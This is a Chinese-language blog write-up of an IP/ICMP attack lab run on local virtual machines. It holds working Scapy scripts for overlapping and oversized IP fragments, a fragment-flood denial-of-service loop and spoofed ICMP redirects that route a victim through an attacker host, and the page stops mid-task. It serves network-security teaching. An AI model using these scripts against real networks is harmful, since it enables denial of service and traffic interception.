@@ -1,0 +1,913 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <title>IP/ICMP Attack lab - Hexo</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css" />
+  
+
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_yg9cfy8wd6.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_pjno9b9zyxs.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script  src="/js/utils.js" ></script>
+<meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+  <div class="mt-3 post-meta">
+    <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+    <time datetime="2020-10-19 15:00">
+      2020年10月19日 下午
+    </time>
+  </div>
+
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      3.8k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      59
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <article class="markdown-body">
+              <h1 id="IP-ICMP-Attacks-Lab"><a href="#IP-ICMP-Attacks-Lab" class="headerlink" title="IP/ICMP Attacks Lab"></a>IP/ICMP Attacks Lab</h1><h2 id="Tasks-1-IP-分片"><a href="#Tasks-1-IP-分片" class="headerlink" title="Tasks 1: IP 分片"></a>Tasks 1: IP 分片</h2><h3 id="Task-1-a：构造IP分片"><a href="#Task-1-a：构造IP分片" class="headerlink" title="Task 1.a：构造IP分片"></a>Task 1.a：构造IP分片</h3><p>在这里，我们需要构造一个UDP报文，并且将它发给UDP server端</p>
+<p>关于UDP中checksum的一些点</p>
+<blockquote>
+<p>It should be noted that the UDP checksum field needs to be set correctly. （因为UDP并没有一个向TCP一样的MSS来进行限制，所以在计算checksum的时候，其实传递到运输层还是整个数据，所以checksum的计算应该是整个数据包，而不是一个分片上的数据）If we do not set this field, Scapy will calculate the checksum for us, but this checksum will only be based on the data in the first fragment, which is incorrect. If we set the checksum field to zero, Scapy will leave it alone. Moreover, the recipient will not validate the UDP checksum if it sees a zero in the checksum field, because in UDP, checksum validation is optional.</p>
+</blockquote>
+<p>相关代码如下</p>
+<pre><code class="hljs routeros"><span class="hljs-comment">#!/usr/bin/python3 </span>
+<span class="hljs-keyword">from</span> scapy.all import *
+
+<span class="hljs-comment"># Construct IP header </span>
+ip = IP(<span class="hljs-attribute">src</span>=<span class="hljs-string">"10.0.2.4"</span>, <span class="hljs-attribute">dst</span>=<span class="hljs-string">"10.0.2.5"</span>)
+ip.id = 1000 # Identification 
+ip.frag = 0 # Offset of this<span class="hljs-built_in"> IP </span>fragment 
+ip.flags = 1 # Flags
+ip.<span class="hljs-attribute">proto</span>=17
+
+<span class="hljs-comment"># Construct UDP header </span>
+udp = UDP(<span class="hljs-attribute">sport</span>=7070, <span class="hljs-attribute">dport</span>=9090) 
+udp.len = 104 # This should be the combined length of all fragments
+
+<span class="hljs-comment"># Construct payload </span>
+payload = <span class="hljs-string">'A'</span> * 32 # Put 80 bytes <span class="hljs-keyword">in</span> the first fragment
+
+<span class="hljs-comment"># Construct the entire packet and send it out </span>
+pkt = ip/udp/payload # <span class="hljs-keyword">For</span> other fragments, we should use ip/payload 
+pkt[UDP].chksum = 0 # <span class="hljs-builtin-name">Set</span> the checksum field <span class="hljs-keyword">to</span> zero 
+send(pkt, <span class="hljs-attribute">verbose</span>=0)
+
+
+<span class="hljs-comment"># Construct IP header </span>
+ip2 = IP(<span class="hljs-attribute">src</span>=<span class="hljs-string">"10.0.2.4"</span>, <span class="hljs-attribute">dst</span>=<span class="hljs-string">"10.0.2.5"</span>)
+ip2.id = 1000 # Identification 
+ip2.frag = 5 # Offset of this<span class="hljs-built_in"> IP </span>fragment 
+ip2.flags = 1 # Flags
+ip2.<span class="hljs-attribute">proto</span>=17
+
+<span class="hljs-comment"># Construct payload </span>
+payload2 = <span class="hljs-string">'B'</span> * 32 # Put 80 bytes <span class="hljs-keyword">in</span> the first fragment
+
+<span class="hljs-comment"># Construct the entire packet and send it out </span>
+pkt2 = ip2/payload2 # <span class="hljs-keyword">For</span> other fragments, we should use ip/payload 
+<span class="hljs-comment">#pkt[UDP].checksum = 0 # Set the checksum field to zero </span>
+send(pkt2, <span class="hljs-attribute">verbose</span>=0)
+
+
+
+<span class="hljs-comment"># Construct IP header </span>
+ip3 = IP(<span class="hljs-attribute">src</span>=<span class="hljs-string">"10.0.2.4"</span>, <span class="hljs-attribute">dst</span>=<span class="hljs-string">"10.0.2.5"</span>)
+ip3.id = 1000 # Identification 
+ip3.frag = 9 # Offset of this<span class="hljs-built_in"> IP </span>fragment 
+ip3.flags = 0 # Flags
+ip3.<span class="hljs-attribute">proto</span>=17
+
+<span class="hljs-comment"># Construct payload </span>
+payload3 = <span class="hljs-string">'C'</span> * 32 # Put 80 bytes <span class="hljs-keyword">in</span> the first fragment
+
+<span class="hljs-comment"># Construct the entire packet and send it out </span>
+pkt3 = ip3/payload3 # <span class="hljs-keyword">For</span> other fragments, we should use ip/payload 
+<span class="hljs-comment">#pkt[UDP].checksum = 0 # Set the checksum field to zero </span>
+send(pkt3, <span class="hljs-attribute">verbose</span>=0)</code></pre>
+
+<p>在client和server端使用wireshark来进行抓包</p>
+<p><img src="/2020/10/19/IP-ICMP-Attack-lab/task1-a-2.PNG" srcset="/img/loading.gif" alt="task1-a-2"></p>
+<p>可以看到此时的分片只有第一个是有UDP报文头部的，而之后的分片是在数据部分直接加上了IP的头部</p>
+<p>此时，对应server端的terminal会显示</p>
+<p><img src="/2020/10/19/IP-ICMP-Attack-lab/task1-a-1.PNG" srcset="/img/loading.gif" alt="task1-a-1"></p>
+<h3 id="Task-1-b：内容重叠的IP分片"><a href="#Task-1-b：内容重叠的IP分片" class="headerlink" title="Task 1.b：内容重叠的IP分片"></a>Task 1.b：内容重叠的IP分片</h3><ol>
+<li><p>第一个和第二个IP分片有K个bytes的重叠部分，在这里每个fragment都还是32bytes，将K设置为了8</p>
+<p> 首先是先发第一个分片，代码如下</p>
+ <pre><code class="hljs routeros"><span class="hljs-comment">#!/usr/bin/python3 </span>
+<span class="hljs-keyword">from</span> scapy.all import *
+
+<span class="hljs-comment"># Construct IP header </span>
+ip = IP(<span class="hljs-attribute">src</span>=<span class="hljs-string">"10.0.2.4"</span>, <span class="hljs-attribute">dst</span>=<span class="hljs-string">"10.0.2.5"</span>)
+ip.id = 1000 # Identification 
+ip.frag = 0 # Offset of this<span class="hljs-built_in"> IP </span>fragment 
+ip.flags = 1 # Flags
+ip.<span class="hljs-attribute">proto</span>=17
+
+<span class="hljs-comment"># Construct UDP header </span>
+udp = UDP(<span class="hljs-attribute">sport</span>=7070, <span class="hljs-attribute">dport</span>=9090) 
+udp.len = 96 # This should be the combined length of all fragments
+
+<span class="hljs-comment"># Construct payload </span>
+payload = <span class="hljs-string">'A'</span> * 24 + <span class="hljs-string">'D'</span> * 8 # Put 80 bytes <span class="hljs-keyword">in</span> the first fragment
+
+<span class="hljs-comment"># Construct the entire packet and send it out </span>
+pkt = ip/udp/payload # <span class="hljs-keyword">For</span> other fragments, we should use ip/payload 
+pkt[UDP].chksum = 0 # <span class="hljs-builtin-name">Set</span> the checksum field <span class="hljs-keyword">to</span> zero 
+send(pkt, <span class="hljs-attribute">verbose</span>=0)
+
+
+<span class="hljs-comment"># Construct IP header </span>
+ip2 = IP(<span class="hljs-attribute">src</span>=<span class="hljs-string">"10.0.2.4"</span>, <span class="hljs-attribute">dst</span>=<span class="hljs-string">"10.0.2.5"</span>)
+ip2.id = 1000 # Identification 
+ip2.frag = 4 # Offset of this<span class="hljs-built_in"> IP </span>fragment 
+ip2.flags = 1 # Flags
+ip2.<span class="hljs-attribute">proto</span>=17
+
+<span class="hljs-comment"># Construct payload </span>
+payload2 =  <span class="hljs-string">'D'</span> * 8  + <span class="hljs-string">'B'</span> * 24 # Put 80 bytes <span class="hljs-keyword">in</span> the first fragment
+
+<span class="hljs-comment"># Construct the entire packet and send it out </span>
+pkt2 = ip2/payload2 # <span class="hljs-keyword">For</span> other fragments, we should use ip/payload 
+<span class="hljs-comment">#pkt[UDP].checksum = 0 # Set the checksum field to zero </span>
+send(pkt2, <span class="hljs-attribute">verbose</span>=0)
+
+
+
+<span class="hljs-comment"># Construct IP header </span>
+ip3 = IP(<span class="hljs-attribute">src</span>=<span class="hljs-string">"10.0.2.4"</span>, <span class="hljs-attribute">dst</span>=<span class="hljs-string">"10.0.2.5"</span>)
+ip3.id = 1000 # Identification 
+ip3.frag = 8 # Offset of this<span class="hljs-built_in"> IP </span>fragment 
+ip3.flags = 0 # Flags
+ip3.<span class="hljs-attribute">proto</span>=17
+
+<span class="hljs-comment"># Construct payload </span>
+payload3 = <span class="hljs-string">'C'</span> * 32 # Put 80 bytes <span class="hljs-keyword">in</span> the first fragment
+
+<span class="hljs-comment"># Construct the entire packet and send it out </span>
+pkt3 = ip3/payload3 # <span class="hljs-keyword">For</span> other fragments, we should use ip/payload 
+<span class="hljs-comment">#pkt[UDP].checksum = 0 # Set the checksum field to zero </span>
+send(pkt3, <span class="hljs-attribute">verbose</span>=0)</code></pre>
+
+<p> 通过代码可以看到有8byte的“D”在第一第二分片上是重叠的，之后在wireshark能够抓到相应的包</p>
+<p> <img src="/2020/10/19/IP-ICMP-Attack-lab/task1-b-2.PNG" srcset="/img/loading.gif" alt="task1-b-2"></p>
+<p> 之后在server端也能够显示</p>
+<p> <img src="/2020/10/19/IP-ICMP-Attack-lab/task1-b-1.PNG" srcset="/img/loading.gif" alt="task1-b-1"></p>
+</li>
+<li><p>之后我们尝试先发送第二个IP分片，再来发送第一个IP分片，看在server端如何显示，调整一下上面代码的发包顺序即可</p>
+ <pre><code class="hljs routeros"><span class="hljs-comment">#!/usr/bin/python3 </span>
+<span class="hljs-keyword">from</span> scapy.all import *
+
+
+<span class="hljs-comment"># Construct IP header </span>
+ip2 = IP(<span class="hljs-attribute">src</span>=<span class="hljs-string">"10.0.2.4"</span>, <span class="hljs-attribute">dst</span>=<span class="hljs-string">"10.0.2.5"</span>)
+ip2.id = 1000 # Identification 
+ip2.frag = 4 # Offset of this<span class="hljs-built_in"> IP </span>fragment 
+ip2.flags = 1 # Flags
+ip2.<span class="hljs-attribute">proto</span>=17
+
+<span class="hljs-comment"># Construct payload </span>
+payload2 =  <span class="hljs-string">'D'</span> * 8  + <span class="hljs-string">'B'</span> * 24 # Put 80 bytes <span class="hljs-keyword">in</span> the first fragment
+
+<span class="hljs-comment"># Construct the entire packet and send it out </span>
+pkt2 = ip2/payload2 # <span class="hljs-keyword">For</span> other fragments, we should use ip/payload 
+<span class="hljs-comment">#pkt[UDP].checksum = 0 # Set the checksum field to zero </span>
+send(pkt2, <span class="hljs-attribute">verbose</span>=0)
+
+
+<span class="hljs-comment"># Construct IP header </span>
+ip = IP(<span class="hljs-attribute">src</span>=<span class="hljs-string">"10.0.2.4"</span>, <span class="hljs-attribute">dst</span>=<span class="hljs-string">"10.0.2.5"</span>)
+ip.id = 1000 # Identification 
+ip.frag = 0 # Offset of this<span class="hljs-built_in"> IP </span>fragment 
+ip.flags = 1 # Flags
+ip.<span class="hljs-attribute">proto</span>=17
+
+<span class="hljs-comment"># Construct UDP header </span>
+udp = UDP(<span class="hljs-attribute">sport</span>=7070, <span class="hljs-attribute">dport</span>=9090) 
+udp.len = 96 # This should be the combined length of all fragments
+
+<span class="hljs-comment"># Construct payload </span>
+payload = <span class="hljs-string">'A'</span> * 24 + <span class="hljs-string">'D'</span> * 8 # Put 80 bytes <span class="hljs-keyword">in</span> the first fragment
+
+<span class="hljs-comment"># Construct the entire packet and send it out </span>
+pkt = ip/udp/payload # <span class="hljs-keyword">For</span> other fragments, we should use ip/payload 
+pkt[UDP].chksum = 0 # <span class="hljs-builtin-name">Set</span> the checksum field <span class="hljs-keyword">to</span> zero 
+send(pkt, <span class="hljs-attribute">verbose</span>=0)
+
+
+<span class="hljs-comment"># Construct IP header </span>
+ip3 = IP(<span class="hljs-attribute">src</span>=<span class="hljs-string">"10.0.2.4"</span>, <span class="hljs-attribute">dst</span>=<span class="hljs-string">"10.0.2.5"</span>)
+ip3.id = 1000 # Identification 
+ip3.frag = 8 # Offset of this<span class="hljs-built_in"> IP </span>fragment 
+ip3.flags = 0 # Flags
+ip3.<span class="hljs-attribute">proto</span>=17
+
+<span class="hljs-comment"># Construct payload </span>
+payload3 = <span class="hljs-string">'C'</span> * 32 # Put 80 bytes <span class="hljs-keyword">in</span> the first fragment
+
+<span class="hljs-comment"># Construct the entire packet and send it out </span>
+pkt3 = ip3/payload3 # <span class="hljs-keyword">For</span> other fragments, we should use ip/payload 
+<span class="hljs-comment">#pkt[UDP].checksum = 0 # Set the checksum field to zero </span>
+send(pkt3, <span class="hljs-attribute">verbose</span>=0)</code></pre>
+
+<p> 在client运行wireshark，发现顺序发生改变</p>
+<p> <img src="/2020/10/19/IP-ICMP-Attack-lab/task1-b-3.PNG" srcset="/img/loading.gif" alt="task1-b-3"></p>
+<p> 但是在server的terminal上面依旧会显示</p>
+<p> <img src="/2020/10/19/IP-ICMP-Attack-lab/task1-b-4.PNG" srcset="/img/loading.gif" alt="task1-b-4"></p>
+<p> 这是由于在server端会进行重组，最终还原为一个完整的IP数据包再递交给上层协议</p>
+</li>
+<li><p>第二个fragment完全包含在第一个fragment当中，并且按第一个第二个的顺序来发分片</p>
+<p> 在这里我是把第一个分片的data设为了64个“A”，第二个分片是32个”B”，但是偏移量和第一个分片的后32个一样</p>
+ <pre><code class="hljs routeros"><span class="hljs-comment">#!/usr/bin/python3 </span>
+<span class="hljs-keyword">from</span> scapy.all import *
+
+<span class="hljs-comment"># Construct IP header </span>
+ip = IP(<span class="hljs-attribute">src</span>=<span class="hljs-string">"10.0.2.4"</span>, <span class="hljs-attribute">dst</span>=<span class="hljs-string">"10.0.2.5"</span>)
+ip.id = 1000 # Identification 
+ip.frag = 0 # Offset of this<span class="hljs-built_in"> IP </span>fragment 
+ip.flags = 1 # Flags
+ip.<span class="hljs-attribute">proto</span>=17
+
+<span class="hljs-comment"># Construct UDP header </span>
+udp = UDP(<span class="hljs-attribute">sport</span>=7070, <span class="hljs-attribute">dport</span>=9090) 
+udp.len = 104 # This should be the combined length of all fragments
+
+<span class="hljs-comment"># Construct payload </span>
+payload = <span class="hljs-string">'A'</span> * 64 # Put 80 bytes <span class="hljs-keyword">in</span> the first fragment
+
+<span class="hljs-comment"># Construct the entire packet and send it out </span>
+pkt = ip/udp/payload # <span class="hljs-keyword">For</span> other fragments, we should use ip/payload 
+pkt[UDP].chksum = 0 # <span class="hljs-builtin-name">Set</span> the checksum field <span class="hljs-keyword">to</span> zero 
+send(pkt, <span class="hljs-attribute">verbose</span>=0)
+
+
+<span class="hljs-comment"># Construct IP header </span>
+ip2 = IP(<span class="hljs-attribute">src</span>=<span class="hljs-string">"10.0.2.4"</span>, <span class="hljs-attribute">dst</span>=<span class="hljs-string">"10.0.2.5"</span>)
+ip2.id = 1000 # Identification 
+ip2.frag = 5 # Offset of this<span class="hljs-built_in"> IP </span>fragment 
+ip2.flags = 1 # Flags
+ip2.<span class="hljs-attribute">proto</span>=17
+
+<span class="hljs-comment"># Construct payload </span>
+payload2 =  <span class="hljs-string">'B'</span> * 32 # Put 80 bytes <span class="hljs-keyword">in</span> the first fragment
+
+<span class="hljs-comment"># Construct the entire packet and send it out </span>
+pkt2 = ip2/payload2 # <span class="hljs-keyword">For</span> other fragments, we should use ip/payload 
+<span class="hljs-comment">#pkt[UDP].checksum = 0 # Set the checksum field to zero </span>
+send(pkt2, <span class="hljs-attribute">verbose</span>=0)
+
+
+
+<span class="hljs-comment"># Construct IP header </span>
+ip3 = IP(<span class="hljs-attribute">src</span>=<span class="hljs-string">"10.0.2.4"</span>, <span class="hljs-attribute">dst</span>=<span class="hljs-string">"10.0.2.5"</span>)
+ip3.id = 1000 # Identification 
+ip3.frag = 9 # Offset of this<span class="hljs-built_in"> IP </span>fragment 
+ip3.flags = 0 # Flags
+ip3.<span class="hljs-attribute">proto</span>=17
+
+<span class="hljs-comment"># Construct payload </span>
+payload3 = <span class="hljs-string">'C'</span> * 32 # Put 80 bytes <span class="hljs-keyword">in</span> the first fragment
+
+<span class="hljs-comment"># Construct the entire packet and send it out </span>
+pkt3 = ip3/payload3 # <span class="hljs-keyword">For</span> other fragments, we should use ip/payload 
+<span class="hljs-comment">#pkt[UDP].checksum = 0 # Set the checksum field to zero </span>
+send(pkt3, <span class="hljs-attribute">verbose</span>=0)</code></pre>
+
+<p> <img src="/2020/10/19/IP-ICMP-Attack-lab/task1-b-6.PNG" srcset="/img/loading.gif" alt="task1-b-6"></p>
+<p> 在server显示当中，第一个包完全把第二包覆盖上去了</p>
+<p> <img src="/2020/10/19/IP-ICMP-Attack-lab/task1-b-5.PNG" srcset="/img/loading.gif" alt="task1-b-5"></p>
+</li>
+<li><p>之后和上面一样，调转一下顺序即可，代码在上面修改就行</p>
+<p> wireshark抓包顺序的结果发生了改变</p>
+<p> <img src="/2020/10/19/IP-ICMP-Attack-lab/task1-b-8.PNG" srcset="/img/loading.gif" alt="task1-b-8"></p>
+<p> 但是在server端的显示是不发生改变的</p>
+<p> <img src="/2020/10/19/IP-ICMP-Attack-lab/task1-b-7.PNG" srcset="/img/loading.gif" alt="task1-b-7"></p>
+</li>
+</ol>
+<h3 id="Task-1-c：发送一个很大的数据包"><a href="#Task-1-c：发送一个很大的数据包" class="headerlink" title="Task 1.c：发送一个很大的数据包"></a>Task 1.c：发送一个很大的数据包</h3><p>思路如下，在这里我们只是随便的进行一个构造，但是IP分片加起来的总长度（IP.length）要大于65536，代码如下</p>
+<pre><code class="hljs routeros"><span class="hljs-comment">#!/usr/bin/python3 </span>
+<span class="hljs-keyword">from</span> scapy.all import *
+
+
+<span class="hljs-comment"># Construct IP header </span>
+ip = IP(<span class="hljs-attribute">src</span>=<span class="hljs-string">"10.0.2.4"</span>, <span class="hljs-attribute">dst</span>=<span class="hljs-string">"10.0.2.5"</span>)
+ip.id = 1000 # Identification 
+ip.frag = 0 # Offset of this<span class="hljs-built_in"> IP </span>fragment 
+ip.flags = 1 # Flags
+ip.<span class="hljs-attribute">proto</span>=17
+
+<span class="hljs-comment"># Construct UDP header </span>
+udp = UDP(<span class="hljs-attribute">sport</span>=7070, <span class="hljs-attribute">dport</span>=9090) 
+udp.len = 64 # This should be the combined length of all fragments
+
+<span class="hljs-comment"># Construct payload </span>
+payload = <span class="hljs-string">'A'</span> * 64000 # Put 80 bytes <span class="hljs-keyword">in</span> the first fragment
+
+<span class="hljs-comment"># Construct the entire packet and send it out </span>
+pkt = ip/udp/payload # <span class="hljs-keyword">For</span> other fragments, we should use ip/payload 
+pkt[UDP].chksum = 0 # <span class="hljs-builtin-name">Set</span> the checksum field <span class="hljs-keyword">to</span> zero 
+send(pkt, <span class="hljs-attribute">verbose</span>=0)
+
+
+
+<span class="hljs-comment"># Construct IP header </span>
+ip2 = IP(<span class="hljs-attribute">src</span>=<span class="hljs-string">"10.0.2.4"</span>, <span class="hljs-attribute">dst</span>=<span class="hljs-string">"10.0.2.5"</span>)
+ip2.id = 1000 # Identification 
+ip2.frag = 8001 # Offset of this<span class="hljs-built_in"> IP </span>fragment 
+ip2.flags = 1 # Flags
+ip2.<span class="hljs-attribute">proto</span>=17
+
+<span class="hljs-comment"># Construct payload </span>
+payload2 =  <span class="hljs-string">'B'</span> * 1536 # Put 80 bytes <span class="hljs-keyword">in</span> the first fragment
+
+<span class="hljs-comment"># Construct the entire packet and send it out </span>
+pkt2 = ip2/payload2 # <span class="hljs-keyword">For</span> other fragments, we should use ip/payload 
+<span class="hljs-comment">#pkt[UDP].checksum = 0 # Set the checksum field to zero </span>
+send(pkt2, <span class="hljs-attribute">verbose</span>=0)</code></pre>
+
+<p>之后在server端观察到的现象是没有字符被打印出来</p>
+<p><img src="/2020/10/19/IP-ICMP-Attack-lab/task1-c-1.PNG" srcset="/img/loading.gif" alt="task1-c-1"></p>
+<p>而用wireshark进行抓包，发现是可以抓到的</p>
+<p><img src="/2020/10/19/IP-ICMP-Attack-lab/task1-c-2.PNG" srcset="/img/loading.gif" alt="task1-c-2"></p>
+<p>推测是由于在server端进行重组的时候发现报文超过IP报文长度限制，没法递交给上一层协议，最后被丢弃</p>
+<h3 id="Task-1-d：发送一个不完整的IP数据包"><a href="#Task-1-d：发送一个不完整的IP数据包" class="headerlink" title="Task 1.d：发送一个不完整的IP数据包"></a>Task 1.d：发送一个不完整的IP数据包</h3><p>关于拒绝服务攻击和IP分片之间的一些关系</p>
+<blockquote>
+<p>. In the attack, Machine A sends a lot of incomplete IP packets to B, i.e., these packets consist of IP fragments, but some fragments are missing. All these incomplete IP packets will stay in the kernel, until they time out. Potentially, this can cause the kernel to commit a lot of kernel memory. In the past, this had resulted in denial-of-service attacks on the server.</p>
+</blockquote>
+<p>思路：在A里面通过循环的方式发送大量的incomplete IP packets来占满kernal</p>
+<p>code</p>
+<pre><code class="hljs routeros"><span class="hljs-comment">#!/usr/bin/python3 </span>
+<span class="hljs-keyword">from</span> scapy.all import *
+
+i = 0
+<span class="hljs-keyword">while</span> i &lt; 1000000 :
+	# Construct<span class="hljs-built_in"> IP </span>header 
+<span class="hljs-built_in">	ip </span>= IP(<span class="hljs-attribute">src</span>=<span class="hljs-string">"10.0.2.4"</span>, <span class="hljs-attribute">dst</span>=<span class="hljs-string">"10.0.2.5"</span>)
+	ip.id = i # Identification 
+	ip.frag = 0 # Offset of this<span class="hljs-built_in"> IP </span>fragment 
+	ip.flags = 1 # Flags
+	ip.<span class="hljs-attribute">proto</span>=17
+
+	# Construct UDP header 
+	udp = UDP(<span class="hljs-attribute">sport</span>=7070, <span class="hljs-attribute">dport</span>=9090) 
+	udp.len = 104 # This should be the combined length of all fragments
+
+	# Construct payload 
+	payload = <span class="hljs-string">'A'</span> * 64 # Put 80 bytes <span class="hljs-keyword">in</span> the first fragment
+
+	# Construct the entire packet <span class="hljs-keyword">and</span> send it out 
+	pkt = ip/udp/payload # <span class="hljs-keyword">For</span> other fragments, we should use ip/payload 
+	pkt[UDP].chksum = 0 # <span class="hljs-builtin-name">Set</span> the checksum field <span class="hljs-keyword">to</span> zero 
+	send(pkt, <span class="hljs-attribute">verbose</span>=0)
+	i = i + 1</code></pre>
+
+<p>wireshark抓包情况</p>
+<p><img src="/2020/10/19/IP-ICMP-Attack-lab/task1-d-1.PNG" srcset="/img/loading.gif" alt="task1-d-1"></p>
+<p>但是之后等待运行半天，依旧没有实现拒绝服务，运行之前的程序，发现还是能够在terminal上面进行显示，但是当真正把空间占满，应该是不会显示的</p>
+<h2 id="Task-2：ICMP重定向攻击"><a href="#Task-2：ICMP重定向攻击" class="headerlink" title="Task 2：ICMP重定向攻击"></a>Task 2：ICMP重定向攻击</h2><p>理解：ICMP是IP层的一个协议，ICMP 允许主机或路由器报告差错情况和提供异常报告给发送者，以便发送者进行补偿行为。</p>
+<p>参考blog ：<a href="https://blog.csdn.net/weixin_34238633/article/details/92882113?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160319624519724838519364%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=160319624519724838519364&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v28-4-92882113.pc_first_rank_v2_rank_v28&utm_term=icmp%E9%87%8D%E5%AE%9A%E5%90%91%E6%8A%A5%E6%96%87%E6%A0%BC%E5%BC%8F&spm=1018.2118.3001.4187" target="_blank" rel="noopener">理解ICMP重定向</a>，<a href="https://blog.51cto.com/sense5/53491" target="_blank" rel="noopener">ICMP协议和类型</a></p>
+<p><img src="/2020/10/19/IP-ICMP-Attack-lab/ICMP-redirect.PNG" srcset="/img/loading.gif" alt="ICMP-redirect"></p>
+<p>code：（10.0.2.4为中间人/VM M，而10.0.2.5为VM A）</p>
+<pre><code class="hljs routeros"><span class="hljs-comment">#!/usr/bin/python3</span>
+<span class="hljs-keyword">from</span> scapy.all import *
+
+
+ip = IP(src = <span class="hljs-string">"10.0.2.1"</span>, dst = <span class="hljs-string">"10.0.2.5"</span>)
+icmp = ICMP(type= 5, code= 0)
+icmp.gw = (<span class="hljs-string">'10.0.2.4'</span>)
+<span class="hljs-comment"># The enclosed IP packet should be the one that</span>
+<span class="hljs-comment"># triggers the redirect message.</span>
+ip2 = IP(src = <span class="hljs-string">"10.0.2.5"</span>, dst = <span class="hljs-string">"182.61.200.6"</span>)
+send(ip/icmp/ip2/UDP());</code></pre>
+
+<p>首先先伪造最外面的IP头部，src是之前的网关的IP地址，而后面的dst为受害者IP地址，之后就是ICMP redirect报文的头部，其中gw代表应该发往的网关IP地址，在这里是VM M的IP地址，之后就是VM A最开始发送往网关1的报文，正是这个报文的开始导致了后面重定向的需要，在这里作为验证信息出现，之后运行即可</p>
+<p>在wireshark里面的抓包情况</p>
+<p><img src="/2020/10/19/IP-ICMP-Attack-lab/task2-1.PNG" srcset="/img/loading.gif" alt="task2-1"></p>
+<p>之后在VM A上面进行ip route get的验证</p>
+<p><img src="/2020/10/19/IP-ICMP-Attack-lab/task2.PNG" srcset="/img/loading.gif" alt="task2"></p>
+<p>可以看到，现在是通过了主机M</p>
+<ol>
+<li><p>Q：Can you use ICMP redirect attacks to redirect to a remote machine? Namely, the IP address assigned to icmp.gw is a computer not on the local LAN. Please show your experiment result, and explain your observation.</p>
+<p> A：将code改为</p>
+ <pre><code class="hljs routeros"><span class="hljs-comment">#!/usr/bin/python3</span>
+<span class="hljs-keyword">from</span> scapy.all import *
+
+
+ip = IP(src = <span class="hljs-string">"10.0.2.1"</span>, dst = <span class="hljs-string">"10.0.2.5"</span>)
+icmp = ICMP(type= 5, code= 0)
+icmp.gw = (<span class="hljs-string">'103.41.167.234'</span>)
+<span class="hljs-comment"># The enclosed IP packet should be the one that</span>
+<span class="hljs-comment"># triggers the redirect message.</span>
+ip2 = IP(src = <span class="hljs-string">"10.0.2.5"</span>, dst = <span class="hljs-string">"182.61.200.6"</span>)
+send(ip/icmp/ip2/UDP());</code></pre>
+
